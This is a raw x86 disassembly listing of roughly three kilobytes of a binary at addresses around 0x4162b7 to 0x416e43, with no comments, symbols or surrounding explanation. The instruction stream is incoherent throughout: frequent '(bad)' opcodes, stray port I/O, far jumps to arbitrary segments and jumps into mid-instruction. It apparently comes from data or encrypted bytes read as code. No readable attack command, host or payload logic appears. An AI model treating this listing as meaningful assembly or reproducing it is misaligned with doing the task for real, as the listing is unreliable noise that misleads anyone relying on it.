  4162b7:	aaa    
  4162b8:	cmp    BYTE PTR [edx-0x14],ch
  4162bb:	imul   edi,DWORD PTR [esi-0x5d],0x420ebf55
  4162c2:	imul   edx,DWORD PTR [edi-0x17],0x6a
  4162c6:	jg     0x416264
  4162c8:	inc    edi
  4162c9:	ja     0x4162b3
  4162cb:	hlt    
  4162cc:	mov    ebp,0x3ee67d62
  4162d1:	push   ecx
  4162d2:	jmp    0x41632e
  4162d4:	outs   dx,DWORD PTR ds:[esi]
  4162d5:	pop    ds
  4162d6:	stos   DWORD PTR es:[edi],eax
  4162d7:	rol    DWORD PTR [esp+edi*8+0x6bbd8b91],1
  4162de:	jge    0x4162a8
  4162e0:	xor    edi,DWORD PTR [edi-0x32]
  4162e3:	mov    eax,DWORD PTR [esi+ecx*2-0x39]
  4162e7:	in     eax,0x61
  4162e9:	and    ecx,DWORD PTR [edx-0x5f5dca62]
  4162ef:	add    cl,BYTE PTR [ebp-0x65]
  4162f2:	(bad)  
  4162f3:	inc    edi
  4162f4:	mov    bl,0x3e
  4162f6:	sti    
  4162f7:	xor    DWORD PTR [edx],0xffffffc1
  4162fa:	popf   
  4162fb:	xchg   edi,eax
  4162fc:	leave  
  4162fd:	inc    edi
  4162fe:	jmp    0x4162fa
  416300:	inc    ebx
  416301:	bound  esi,QWORD PTR [eax+0xc]
  416304:	clc    
  416305:	bound  esi,QWORD PTR [edi]
  416307:	adc    ebx,DWORD PTR [ebx+eiz*1-0x4f]
  41630b:	cmp    DWORD PTR [esi+0x71f425cb],0xffffffde
  416312:	mov    ecx,0x57cf535d
  416317:	out    0x33,eax
  416319:	cmp    esi,DWORD PTR [esi]
  41631b:	xchg   esp,eax
  41631c:	ret    0x79d9
  41631f:	aad    0xd7
  416321:	xchg   BYTE PTR [ebx],ah
  416323:	(bad)  
  416324:	mov    WORD PTR [ebx-0x6d],ds
  416327:	ins    BYTE PTR es:[edi],dx
  416328:	fild   WORD PTR [ebp-0x3d559955]
  41632e:	repnz sbb edx,DWORD PTR [eax+0xc]
  416332:	lock cmp edi,ebx
  416335:	or     al,0xb1
  416337:	xchg   ebp,eax
  416338:	jmp    0xb03a:0x314a1b32
  41633f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416340:	mov    edx,0x5cc8328d
  416345:	or     ecx,DWORD PTR [eax-0x45]
  416348:	xchg   esi,eax
  416349:	xchg   ebp,eax
  41634a:	stos   DWORD PTR es:[edi],eax
  41634b:	xchg   edx,eax
	...
  416524:	call   0x7fb7ccf9
  416529:	idiv   ecx
  41652b:	ficom  WORD PTR [ebp+0x2e]
  41652e:	inc    esp
  41652f:	and    al,0x91
  416531:	mov    ds:0x6f8d051e,eax
  416536:	add    DWORD PTR [eax],eax
  416538:	push   ds
  416539:	pop    es
  41653a:	add    BYTE PTR [eax],al
  41653c:	pop    eax
  41653d:	(bad)  
  41653e:	sub    al,0x46
  416540:	push   ebp
  416541:	sub    ah,dl
  416543:	scas   al,BYTE PTR es:[edi]
  416544:	mov    ah,0x94
  416546:	cli    
  416547:	bound  edx,QWORD PTR [edi+0x60eb9465]
  41654d:	dec    eax
  41654e:	cmp    eax,0xd8c95b3b
  416553:	xor    bh,dl
  416555:	test   al,0x2b
  416557:	data16 fmul QWORD PTR [edx]
  41655a:	cmc    
  41655b:	xchg   ch,cl
  41655d:	pop    ebx
  41655e:	fnstcw WORD PTR [ebx]
  416560:	sub    BYTE PTR [edi],al
  416562:	fldcw  WORD PTR [esi-0x26d82f46]
  416568:	xor    eax,esp
  41656a:	xchg   edi,eax
  41656b:	enter  0x3fe2,0xe4
  41656f:	int    0xa1
  416571:	call   0x61e3f0aa
  416576:	call   0xccd3:0xed2f3aaa
  41657d:	dec    ebx
  41657e:	imul   edi,esp,0xffffffb6
  416581:	xor    eax,0x9c1a77d1
  416586:	dec    ecx
  416587:	in     eax,dx
  416588:	push   esp
  416589:	pop    edx
  41658a:	ins    DWORD PTR es:[edi],dx
  41658b:	hlt    
  41658c:	jae    0x416578
  41658e:	scas   al,BYTE PTR es:[edi]
  41658f:	arpl   WORD PTR [eax],dx
  416591:	xor    DWORD PTR [eax+ecx*4+0x77],edx
  416595:	ret    0x41bb
  416598:	add    DWORD PTR [ebx],esi
  41659a:	lahf   
  41659b:	fs fwait
  41659d:	xor    dh,BYTE PTR [ebp-0xd1f233]
  4165a3:	jo     0x416593
  4165a5:	pop    ds
  4165a6:	jnp    0x416619
  4165a8:	push   ds
  4165a9:	sub    eax,0xf7ecb5f8
  4165ae:	mov    edi,0x54912fd6
  4165b3:	cs cli 
  4165b5:	mov    esp,0x71cef3fc
  4165ba:	gs and al,0x41
  4165bd:	fsubr  st,st(1)
  4165bf:	sbb    eax,0xf4ac3ec3
  4165c4:	push   ebx
  4165c5:	out    dx,eax
  4165c6:	jecxz  0x4165f6
  4165c8:	add    DWORD PTR [eax-0x61],0x1218900f
  4165cf:	mov    ds:0xf62703b,al
  4165d4:	add    DWORD PTR [ebx+ecx*2],0xb
  4165d8:	inc    eax
  4165d9:	and    ch,cl
  4165db:	mov    dl,BYTE PTR [ebp-0x56]
  4165de:	ret    0xca50
  4165e1:	push   ebp
  4165e2:	imul   ebp,DWORD PTR [edi*8-0x40d493f7],0xffffffaf
  4165ea:	fcmovnu st,st(1)
  4165ec:	or     BYTE PTR [esp+esi*4-0x61366685],0x18
  4165f4:	icebp  
  4165f5:	pushf  
  4165f6:	lods   al,BYTE PTR ds:[esi]
  4165f7:	push   ebp
  4165f8:	mov    ds:0x1bd935b4,al
  4165fd:	daa    
  4165fe:	jns    0x4165fb
  416600:	popf   
  416601:	cmp    DWORD PTR ds:0xee98b318,edi
  416607:	in     al,dx
  416608:	push   ecx
  416609:	out    dx,eax
  41660a:	mov    bh,0xe
  41660c:	push   ds
  41660d:	stos   DWORD PTR es:[di],eax
  41660f:	jmp    0x41664a
  416611:	xchg   ebp,eax
  416612:	in     eax,0xc
  416614:	call   0x2743344e
  416619:	lahf   
  41661a:	jmp    0x31ae:0xd5bb6ecb
  416621:	add    BYTE PTR [edx],0x2a
  416624:	xor    al,0x7c
  416626:	icebp  
  416627:	imul   edi,DWORD PTR [esi-0x775d746],0xf
  41662e:	sub    bh,al
  416630:	cli    
  416631:	ror    BYTE PTR ds:0xb5fc5e50,1
  416637:	shl    BYTE PTR [edi-0x43],cl
  41663a:	mov    ebp,0x973741c9
  41663f:	jae    0x41663d
  416641:	or     DWORD PTR [ebx+0x7e320138],edi
  416647:	mov    bh,0x52
  416649:	cli    
  41664a:	test   al,0x3b
  41664c:	jg     0x416695
  41664e:	pop    ebx
  41664f:	mov    ds:0xafcd5378,eax
  416654:	scas   eax,DWORD PTR es:[edi]
  416655:	add    al,0x8f
  416657:	jno    0x4166cd
  416659:	and    al,0x5c
  41665b:	pop    edx
  41665c:	jne    0x41669c
  41665e:	pop    ds
  41665f:	push   esi
  416660:	adc    ecx,DWORD PTR [eax-0x51]
  416663:	imul   edi,DWORD PTR [esi-0x30],0x1a
  416667:	stc    
  416668:	fst    DWORD PTR [eax]
  41666a:	ret    
  41666b:	out    0x5f,eax
  41666d:	xchg   ecx,eax
  41666e:	xor    eax,0x42012ec1
  416673:	pusha  
  416674:	mov    ebx,0xe61637fd
  416679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41667a:	and    eax,0xeb48a53d
  41667f:	jne    0x4166a3
  416681:	aas    
  416682:	jo     0x416673
  416684:	ins    DWORD PTR es:[edi],dx
  416685:	out    dx,eax
  416686:	fs es ins DWORD PTR es:[edi],dx
  416689:	nop
  41668a:	mov    ebp,0xaba86595
  41668f:	clc    
  416690:	inc    ebp
  416691:	or     DWORD PTR [edi],ecx
  416693:	pop    ds
  416694:	fild   QWORD PTR [ecx-0x44]
  416697:	ret    
  416698:	fld    TBYTE PTR [edi]
  41669a:	js     0x4166d1
  41669c:	in     al,0x29
  41669e:	enter  0xdf4,0x7c
  4166a2:	lea    edi,[ecx]
  4166a4:	aas    
  4166a5:	scas   eax,DWORD PTR es:[edi]
  4166a6:	int3   
  4166a7:	repnz mov fs,ecx
  4166aa:	(bad)  
  4166ab:	lock mov ah,0xc4
  4166ae:	sbb    eax,0xa7d678cf
  4166b3:	xor    DWORD PTR ds:0x925da8d4,0xffffffb9
  4166ba:	int    0x62
  4166bc:	(bad)  
  4166bd:	out    dx,al
  4166be:	fld    QWORD PTR [edx-0x3f4f0dcf]
  4166c4:	pop    ebp
  4166c5:	mov    eax,ds:0x382c311f
  4166ca:	rcr    esi,1
  4166cc:	add    DWORD PTR ds:0x9c86ab26,ebx
  4166d2:	mov    WORD PTR ds:0x2ab7b94b,es
  4166d8:	hlt    
  4166d9:	(bad)  
  4166da:	inc    esp
  4166db:	and    dl,cl
  4166dd:	loope  0x416726
  4166df:	fwait
  4166e0:	outs   dx,BYTE PTR ds:[esi]
  4166e1:	imul   ebx,DWORD PTR [edx],0x1d
  4166e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166e5:	mov    ds,WORD PTR [ebp-0x1215c838]
  4166eb:	pop    es
  4166ec:	push   0xb3eccb7c
  4166f1:	xchg   esp,eax
  4166f2:	mov    ecx,0x27f0017f
  4166f7:	(bad)  [esi+ebp*1]
  4166fa:	fld    DWORD PTR [esi]
  4166fc:	sub    eax,0xb562b2a
  416701:	mov    esi,0x88db03b7
  416706:	fstp   QWORD PTR [esi+edi*1-0x43d761c]
  41670d:	pop    es
  41670e:	outs   dx,BYTE PTR ds:[esi]
  41670f:	inc    ebp
  416710:	xchg   BYTE PTR [edx-0x5afedad3],cl
  416716:	(bad)  
  416717:	jo     0x416713
  416719:	popf   
  41671a:	mov    ch,0xfe
  41671c:	adc    eax,0x1edbb0a6
  416721:	mov    bl,0xdb
  416723:	sti    
  416724:	sub    bh,ah
  416726:	fnsave [edi]
  416728:	add    esp,ebx
  41672a:	(bad)
  41672e:	enter  0x46ff,0xb
  416732:	push   ebx
  416733:	fld    DWORD PTR [eax]
  416735:	sub    BYTE PTR [edi],cl
  416737:	xchg   ebx,eax
  416738:	fnstenv [edi-0x2d1bd27a]
  41673e:	mov    eax,ds:0xa65dfbb
  416743:	ds pop edx
  416745:	fstp   st(6)
  416747:	push   edi
  416748:	dec    ebp
  416749:	rcr    BYTE PTR [ebx-0x1ec82521],cl
  41674f:	nop
  416750:	mov    BYTE PTR [ecx-0x79],cl
  416753:	iret   
  416754:	lds    esi,FWORD PTR [edx+esi*4]
  416757:	cmp    BYTE PTR [edi-0xc7e3ffd],ch
  41675d:	inc    DWORD PTR [esi]
  41675f:	push   ebx
  416760:	xchg   esi,eax
  416761:	jae    0x416739
  416763:	clc    
  416764:	and    al,0xa9
  416766:	and    dl,BYTE PTR [esi]
  416768:	jecxz  0x416777
  41676a:	loop   0x4167a5
  41676c:	(bad)  
  41676d:	fbstp  TBYTE PTR [ecx+edx*4+0x236aabc4]
  416774:	and    edi,DWORD PTR ds:[edi]
  416777:	sub    BYTE PTR [ecx+0x7a],ah
  41677a:	pop    ebp
  41677b:	add    DWORD PTR [edx],0xc33aa22c
  416781:	test   DWORD PTR [edi+0x35],ecx
  416784:	cmp    DWORD PTR [ebx],edx
  416786:	jmp    0xb2db:0xcd454185
  41678d:	sahf   
  41678e:	fcmove st,st(5)
  416790:	iret   
  416791:	fld    DWORD PTR [esi+esi*8-0xc4d4448]
  416798:	push   edx
  416799:	fstp   TBYTE PTR [ebx]
  41679b:	test   eax,0xfe7f6b7d
  4167a0:	push   cs
  4167a1:	mov    bh,0xc5
  4167a3:	ror    BYTE PTR [eax],0x39
  4167a6:	iret   
  4167a7:	push   ss
  4167a8:	nop
  4167a9:	dec    edx
  4167aa:	cmc    
  4167ab:	mov    ah,0xa5
  4167ad:	mov    eax,0x3d24ba96
  4167b2:	push   0x26338fed
  4167b7:	sub    ecx,ebx
  4167b9:	jns    0x4167ac
  4167bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167bc:	mov    BYTE PTR [edi],dh
  4167be:	dec    al
  4167c0:	ins    BYTE PTR es:[edi],dx
  4167c1:	mov    ds:0x96704dfd,al
  4167c6:	inc    ebx
  4167c7:	mov    edi,0x39373890
  4167cc:	pop    ss
  4167cd:	daa    
  4167ce:	xor    DWORD PTR [edx],ebx
  4167d0:	out    dx,al
  4167d1:	and    DWORD PTR [esi],esi
  4167d3:	out    0xa4,al
  4167d5:	psubb  mm7,QWORD PTR [edx-0x4a1c91f2]
  4167dc:	xchg   ebx,eax
  4167dd:	sub    bh,BYTE PTR [ebp-0x58]
  4167e0:	dec    esi
  4167e1:	(bad)  
  4167e2:	push   esp
  4167e3:	push   esi
  4167e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e5:	add    BYTE PTR [esi-0x1e80c319],0x80
  4167ec:	xor    edi,DWORD PTR [edi+0x112ab6a3]
  4167f2:	fwait
  4167f3:	mov    dl,0xf6
  4167f5:	jp     0x4167dd
  4167f7:	aam    0x9c
  4167f9:	xor    eax,0x1ca6d3f
  4167fe:	sbb    BYTE PTR [ebx+0x2],ah
  416801:	jae    0x41686d
  416803:	out    dx,eax
  416804:	ja     0x41686c
  416806:	ds fwait
  416808:	std    
  416809:	mov    cl,0xe3
  41680b:	daa    
  41680c:	jno    0x416857
  41680e:	and    esi,DWORD PTR [ecx+0x6c7aae68]
  416814:	mov    bl,BYTE PTR es:0x3e69845c
  41681b:	xchg   ebp,eax
  41681c:	cmp    eax,0xf862ff5e
  416821:	add    ebx,esp
  416823:	or     DWORD PTR [ebx-0x17a2e4f9],ecx
  416829:	imul   ecx,DWORD PTR [edi-0x1993718f],0x26c688bb
  416833:	jno    0x4168a2
  416835:	outs   dx,DWORD PTR ds:[esi]
  416836:	aam    0x3d
  416838:	xchg   esp,eax
  416839:	mov    ax,0xe68e
  41683d:	or     edi,DWORD PTR [ecx+ecx*8+0x33]
  416841:	mov    eax,ds:0x33661a47
  416846:	es test eax,0xadcdd1aa
  41684c:	inc    esi
  41684d:	cmc    
  41684e:	loop   0x41683d
  416850:	mov    dh,0x62
  416852:	stos   BYTE PTR es:[edi],al
  416853:	jge    0x4167e2
  416855:	rcl    DWORD PTR [eax-0x7197a6b3],0x1b
  41685c:	repnz or BYTE PTR [esi+ecx*4],0x66
  416861:	jns    0x416865
  416863:	jge    0x4167f7
  416865:	cs push edi
  416867:	fiadd  DWORD PTR [ebp+eax*8+0x52]
  41686b:	dec    ebx
  41686c:	add    al,0x23
  41686e:	je     0x4168e7
  416870:	sbb    al,0x60
  416872:	(bad)  
  416873:	pushf  
  416874:	xchg   DWORD PTR ds:0xb5f3d03c,edi
  41687a:	aas    
  41687b:	sahf   
  41687c:	in     al,0x80
  41687e:	or     BYTE PTR [esi+0x114f96e2],bh
  416884:	xchg   edx,eax
  416885:	mov    ch,0x5d
  416887:	push   0xa70e0244
  41688c:	aam    0x46
  41688e:	sahf   
  41688f:	dec    ebx
  416890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416891:	cwde   
  416892:	inc    ecx
  416893:	lods   eax,DWORD PTR ds:[esi]
  416894:	dec    esi
  416895:	stos   DWORD PTR es:[edi],eax
  416896:	adc    ecx,eax
  416898:	push   esi
  416899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41689a:	xor    ebx,DWORD PTR [edx-0x34]
  41689d:	and    cl,BYTE PTR [edx]
  41689f:	dec    ecx
  4168a0:	sbb    bh,BYTE PTR [ebp+0x489f8a27]
  4168a6:	lods   eax,DWORD PTR ds:[esi]
  4168a7:	fcmove st,st(6)
  4168a9:	mov    ch,0xca
  4168ab:	or     al,0x1a
  4168ad:	cli    
  4168ae:	aas    
  4168af:	push   ebx
  4168b0:	scas   al,BYTE PTR es:[edi]
  4168b1:	outs   dx,DWORD PTR ds:[esi]
  4168b2:	xor    DWORD PTR [edi],0xffffffce
  4168b5:	mov    dh,0x44
  4168b7:	add    eax,ecx
  4168b9:	mov    ah,0xaf
  4168bb:	leave  
  4168bc:	and    cl,dh
  4168be:	dec    edx
  4168bf:	ja     0x41687a
  4168c1:	leave  
  4168c2:	sbb    esi,DWORD PTR [ebx+0x13]
  4168c5:	jge    0x416917
  4168c7:	addr16 popf 
  4168c9:	test   DWORD PTR [ecx-0x3d],ebp
  4168cc:	es sti 
  4168ce:	sbb    BYTE PTR [ebp-0x5712600c],bh
  4168d4:	adc    DWORD PTR es:0xe5091e6b,ecx
  4168db:	mov    ecx,0x8a94c785
  4168e0:	(bad)  
  4168e1:	(bad)
  4168e4:	and    DWORD PTR [ebp+edx*8-0x435dadc9],eax
  4168eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168ec:	ds inc esi
  4168ee:	ret    0xad9a
  4168f1:	inc    esp
  4168f2:	jmp    0x86bc5830
  4168f7:	xor    DWORD PTR [ecx],edx
  4168f9:	stos   DWORD PTR es:[edi],eax
  4168fa:	aad    0x13
  4168fc:	rcr    DWORD PTR [ecx],cl
  4168fe:	out    dx,eax
  4168ff:	mov    bh,0x70
  416901:	push   es
  416902:	pop    edx
  416903:	fimul  WORD PTR [edi-0x2fcdffc5]
  416909:	push   edx
  41690a:	mov    eax,0x638f1320
  41690f:	sbb    ebp,ebp
  416911:	inc    esi
  416912:	mov    ch,dl
  416914:	xchg   esi,esi
  416916:	xchg   esp,eax
  416917:	jbe    0x4168cd
  416919:	mov    al,ds:0x3a6b1400
  41691e:	jnp    0x416928
  416920:	fadd   QWORD PTR [esi+0x7a123586]
  416926:	int    0xcd
  416928:	mov    BYTE PTR [ebx],bl
  41692a:	jmp    0xcf2d:0x5b3359f6
  416931:	arpl   WORD PTR [ebx+0x4dc386bd],dx
  416937:	mov    dh,0xd6
  416939:	dec    esi
  41693a:	aad    0x97
  41693c:	pop    eax
  41693d:	xor    edi,esp
  41693f:	out    dx,al
  416940:	scas   eax,DWORD PTR es:[edi]
  416941:	cmp    BYTE PTR [ecx],cl
  416943:	lds    esi,FWORD PTR [esp+eiz*4+0x28]
  416947:	das    
  416948:	adc    al,0x20
  41694a:	inc    esp
  41694b:	push   ebp
  41694c:	cli    
  41694d:	fldcw  WORD PTR [ebx]
  41694f:	or     BYTE PTR [esp+eiz*2-0x54],ah
  416953:	loopne 0x416986
  416955:	fld    QWORD PTR [esi+0x2d]
  416958:	jmp    0xc159c159
  41695d:	cld    
  41695e:	mov    esp,0xda350c55
  416963:	call   0xeb4caa2e
  416968:	pusha  
  416969:	loop   0x4169d3
  41696b:	xchg   edi,eax
  41696c:	xchg   ecx,eax
  41696d:	jl     0x4169c6
  41696f:	jl     0x416999
  416971:	xchg   esp,eax
  416972:	xchg   edx,eax
  416973:	adc    DWORD PTR [edi],esi
  416975:	pop    ds
  416976:	jno    0x416905
  416978:	fadd   DWORD PTR [eax-0x1e]
  41697b:	mov    esi,0x40cfb63
  416980:	out    0x6,al
  416982:	test   dh,al
  416984:	loopne 0x41699c
  416986:	repnz mov ecx,0xead65b98
  41698c:	(bad)  [eax+0x38e3a7f0]
  416992:	fs not edi
  416995:	mov    bh,0xaa
  416997:	ret    
  416998:	mov    ah,0xe3
  41699a:	test   al,0x6d
  41699c:	sub    dh,BYTE PTR [ecx]
  41699e:	addr16 hlt 
  4169a0:	call   0x34a:0x6d60999
  4169a7:	repz xlat BYTE PTR ds:[ebx]
  4169a9:	pop    es
  4169aa:	xchg   edi,eax
  4169ab:	and    BYTE PTR [edi-0x7],ah
  4169ae:	ss cmc 
  4169b0:	adc    eax,0x35170daa
  4169b5:	add    eax,0xa411b3c4
  4169ba:	gs popa 
  4169bc:	jmp    0x32ee:0xf5f62a04
  4169c3:	jge    0x4169f3
  4169c5:	sbb    eax,0x321337ef
  4169ca:	scas   al,BYTE PTR es:[edi]
  4169cb:	or     eax,0x8c8fb692
  4169d0:	test   BYTE PTR [ebx+0x27],ah
  4169d3:	or     bh,BYTE PTR [ebp+0x7001f79]
  4169d9:	pop    esp
  4169da:	mov    edx,0x8fde99c1
  4169df:	stc    
  4169e0:	mov    ecx,0x2386d4e2
  4169e5:	imul   dh
  4169e7:	dec    ebp
  4169e8:	test   al,0xd2
  4169ea:	adc    dh,bh
  4169ec:	fucomp st(7)
  4169ee:	stos   BYTE PTR es:[edi],al
  4169ef:	sbb    ecx,edi
  4169f1:	(bad)  
  4169f2:	and    ah,cl
  4169f4:	push   ds
  4169f5:	or     BYTE PTR [ecx+0x50],dh
  4169f8:	cwde   
  4169f9:	shl    dl,1
  4169fb:	out    0xa5,al
  4169fd:	pushf  
  4169fe:	mov    edx,0xbdd31c45
  416a03:	aas    
  416a04:	push   esi
  416a05:	mov    ds:0x93f17ece,eax
  416a0a:	call   0x5c3ffe02
  416a0f:	in     al,dx
  416a10:	sub    edx,esp
  416a12:	retf   0x1b0e
  416a15:	call   0x34bb6904
  416a1a:	mov    esp,DWORD PTR [ebx+0x5b]
  416a1d:	push   0x4d
  416a1f:	dec    bl
  416a21:	xor    eax,0x1b068aa3
  416a26:	mov    BYTE PTR [edx+0x1c],ah
  416a29:	adc    edx,ebp
  416a2b:	call   0xe15606ed
  416a30:	sbb    DWORD PTR [ebx],edx
  416a32:	stc    
  416a33:	cmp    ah,BYTE PTR [ecx+0x6b]
  416a36:	lds    esp,FWORD PTR ds:0x732e3b10
  416a3c:	rcr    BYTE PTR [edx+0x291a2673],0x22
  416a43:	std    
  416a44:	xlat   BYTE PTR ds:[ebx]
  416a45:	push   ecx
  416a46:	mov    bh,0x13
  416a48:	fimul  DWORD PTR [ebx-0x77b924fe]
  416a4e:	mov    ds:0x1d0d98cd,eax
  416a53:	aad    0x87
  416a55:	cld    
  416a56:	xchg   BYTE PTR [ebp-0x2a],bl
  416a59:	push   es
  416a5a:	les    ebx,FWORD PTR [edi]
  416a5c:	add    al,0x2f
  416a5e:	push   ebx
  416a5f:	les    ecx,FWORD PTR [ecx]
  416a61:	mov    ebx,0x31948e53
  416a66:	mov    eax,ds:0x237699f8
  416a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a6c:	dec    edx
  416a6d:	jl     0x416acb
  416a6f:	jg     0x416a58
  416a71:	mov    ecx,edx
  416a73:	adc    bh,0xaf
  416a76:	stc    
  416a77:	fsubr  DWORD PTR [eax-0x47747638]
  416a7d:	nop
  416a7e:	fldenv [edx+0x51]
  416a81:	cwde   
  416a82:	jge    0x416adc
  416a84:	mov    ebx,eax
  416a86:	jo     0x416a4d
  416a88:	mov    ecx,0x3656f3a7
  416a8d:	popf   
  416a8e:	lds    esp,FWORD PTR [edx+ebp*1+0xb]
  416a92:	pop    ebp
  416a93:	and    ecx,DWORD PTR [ecx-0x59a88eba]
  416a99:	xor    dl,BYTE PTR [ecx+eax*4]
  416a9c:	mov    bh,0xe2
  416a9e:	pop    ss
  416a9f:	jle    0x416b1f
  416aa1:	mov    cl,dh
  416aa3:	shl    BYTE PTR [edi],0xe8
  416aa6:	mov    ds:0x11ecd58b,al
  416aab:	inc    edx
  416aac:	mov    esp,0x8cf6220b
  416ab1:	cli    
  416ab2:	jg     0x416b14
  416ab4:	push   ds
  416ab5:	sub    DWORD PTR [esi],esi
  416ab7:	fcomi  st,st(5)
  416ab9:	mov    al,0xff
  416abb:	clc    
  416abc:	call   0x4b78:0x83798804
  416ac3:	adc    dh,BYTE PTR [ebp+0xc]
  416ac6:	sbb    dl,BYTE PTR [ebx+0x228324d5]
  416acc:	cmp    BYTE PTR [ebp+0x23],ah
  416acf:	add    bl,0xb
  416ad2:	sub    ebx,DWORD PTR [eax+0x6]
  416ad5:	sub    dh,ch
  416ad7:	push   0xaf1dcaf3
  416adc:	mov    bl,0x63
  416ade:	cdq    
  416adf:	xchg   esp,eax
  416ae0:	(bad)
  416ae3:	in     al,0xc8
  416ae5:	mov    edi,0x6f90a15b
  416aea:	js     0x416ae5
  416aec:	pop    es
  416aed:	pop    ebp
  416aee:	cli    
  416aef:	cmp    dl,BYTE PTR [edx-0x7c]
  416af2:	add    DWORD PTR [ecx+0x2ef3d363],esp
  416af8:	and    DWORD PTR [ebx+0x3716e56],edx
  416afe:	ret    
  416aff:	add    eax,0xa1ff36ed
  416b04:	out    0xf8,al
  416b06:	jmp    0xffe1:0x4372de63
  416b0d:	cdq    
  416b0e:	cmp    DWORD PTR [ebx+0x4c],eax
  416b11:	popf   
  416b12:	add    DWORD PTR [edx+0x76447dbb],0xffffffbd
  416b19:	jg     0x416b36
  416b1b:	push   ebx
  416b1c:	stos   DWORD PTR es:[edi],eax
  416b1d:	push   esp
  416b1e:	test   DWORD PTR [ecx],edi
  416b20:	sti    
  416b21:	jg     0x416ab8
  416b23:	xchg   edi,eax
  416b24:	adc    cl,dh
  416b26:	add    ebx,DWORD PTR [esi+ebp*4]
  416b29:	aaa    
  416b2a:	adc    al,0x92
  416b2c:	adc    bl,BYTE PTR ds:0xf2f68439
  416b32:	xchg   esp,eax
  416b33:	leave  
  416b34:	repz dec ebx
  416b36:	cmp    ah,ah
  416b38:	push   DWORD PTR ds:0x479fb4ab
  416b3e:	adc    edi,DWORD PTR [edi-0x7f]
  416b41:	cmp    BYTE PTR [edx],ch
  416b43:	cli    
  416b44:	mov    ds:0xd10a8637,eax
  416b49:	or     edi,ebx
  416b4b:	add    DWORD PTR [eax-0x6dfed6c4],eax
  416b51:	dec    esi
  416b52:	int    0xe2
  416b54:	cmc    
  416b55:	mov    edi,0x4e2fba11
  416b5a:	push   es
  416b5b:	in     al,dx
  416b5c:	cmp    al,0xdf
  416b5e:	in     al,dx
  416b5f:	fwait
  416b60:	and    esi,DWORD PTR [ebp-0x3b]
  416b63:	fst    QWORD PTR [ebp+eiz*1-0x63118250]
  416b6a:	or     DWORD PTR [ebx],esi
  416b6c:	push   edx
  416b6d:	fld    TBYTE PTR [edx+esi*8]
  416b70:	and    eax,0xf0f2e480
  416b75:	ja     0x416b59
  416b77:	test   al,0xf9
  416b79:	pop    ss
  416b7a:	ins    BYTE PTR es:[edi],dx
  416b7b:	pop    edi
  416b7c:	xor    eax,esi
  416b7e:	scas   al,BYTE PTR es:[edi]
  416b7f:	(bad)  
  416b80:	out    0x9f,al
  416b82:	and    ebx,edi
  416b84:	rcl    DWORD PTR [esi+0x2a],0x5d
  416b88:	fdivr  st(7),st
  416b8a:	xchg   ebp,eax
  416b8b:	cmp    esi,DWORD PTR [ecx-0x68cc8dae]
  416b91:	sbb    DWORD PTR [esi+0x65],eax
  416b94:	jae    0x416b67
  416b96:	and    BYTE PTR fs:[edx+0x400be96],dh
  416b9d:	mov    bl,0x18
  416b9f:	lods   al,BYTE PTR ds:[esi]
  416ba0:	sub    DWORD PTR [eax+0x526dc3e5],esp
  416ba6:	sub    esp,esp
  416ba8:	data16 test al,0x8b
  416bab:	jbe    0x416c03
  416bad:	fild   WORD PTR [edi-0xf743a8e]
  416bb3:	or     cl,bh
  416bb5:	clc    
  416bb6:	and    BYTE PTR [edi+0x8450ea1],dl
  416bbc:	into   
  416bbd:	jae    0x416ba0
  416bbf:	add    al,0x45
  416bc1:	push   esi
  416bc2:	sahf   
  416bc3:	jno    0x416b4c
  416bc5:	shl    BYTE PTR [eax],cl
  416bc7:	loop   0x416b84
  416bc9:	shl    BYTE PTR [ebx-0x78],0x45
  416bcd:	lods   al,BYTE PTR ds:[esi]
  416bce:	daa    
  416bcf:	or     eax,0xd7695fa6
  416bd4:	xchg   edi,eax
  416bd5:	shl    DWORD PTR [ebx+esi*2+0x59],0xd8
  416bda:	cmp    al,bl
  416bdc:	(bad)  
  416bdd:	imul   edx,DWORD PTR [edx+0x61df06ea],0x1f
  416be4:	nop
  416be5:	into   
  416be6:	mov    edi,0xaa34ce17
  416beb:	cmp    dh,BYTE PTR [ebp+0x4c]
  416bee:	retf   0x9813
  416bf1:	mov    eax,ds:0x1f3234cf
  416bf6:	and    al,0x48
  416bf8:	jns    0x416be4
  416bfa:	popa   
  416bfb:	jo     0x416bd8
  416bfd:	sar    dh,1
  416bff:	pusha  
  416c00:	jb     0x416c3b
  416c02:	inc    ebp
  416c03:	pusha  
  416c04:	mov    es,WORD PTR [ecx]
  416c06:	pop    es
  416c07:	enter  0xf49b,0x98
  416c0b:	dec    esp
  416c0c:	sbb    al,0x72
  416c0e:	rcr    BYTE PTR [ebx-0x30],cl
  416c11:	push   ebp
  416c12:	inc    eax
  416c13:	and    dl,ah
  416c15:	lahf   
  416c16:	arpl   WORD PTR [edx-0x10],si
  416c19:	leave  
  416c1a:	outs   dx,BYTE PTR ds:[esi]
  416c1b:	xchg   DWORD PTR [ebx+0x67236647],ecx
  416c21:	add    eax,0x6fdbf43b
  416c26:	mov    BYTE PTR [edi+0x74],dl
  416c29:	lods   al,BYTE PTR ds:[esi]
  416c2a:	shl    DWORD PTR [ebx-0x1145054a],1
  416c30:	(bad)  
  416c31:	xor    eax,0x20c260b2
  416c36:	sub    eax,0x21adff88
  416c3b:	sub    edi,DWORD PTR [ebx-0x4c]
  416c3e:	inc    ebp
  416c3f:	sub    al,0x11
  416c41:	jne    0x416c8e
  416c43:	call   0xcb7f:0xb5f1f71f
  416c4a:	icebp  
  416c4b:	imul   ebx,DWORD PTR [edx+esi*4-0x28],0xffffff9b
  416c50:	dec    ebp
  416c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c52:	ficom  WORD PTR [edx]
  416c54:	out    0x9a,eax
  416c56:	mov    ebx,0x5363c3
	...
  416e2f:	add    BYTE PTR [eax],al
  416e31:	add    BYTE PTR [esi-0x8131a83],cl
  416e37:	cld    
  416e38:	(bad)  
  416e39:	jg     0x416ead
  416e3b:	and    eax,0x88071474
  416e40:	mov    bh,0xe4
  416e42:	cmc    
  416e43:	les    eax,FWORD PTR [ecx]
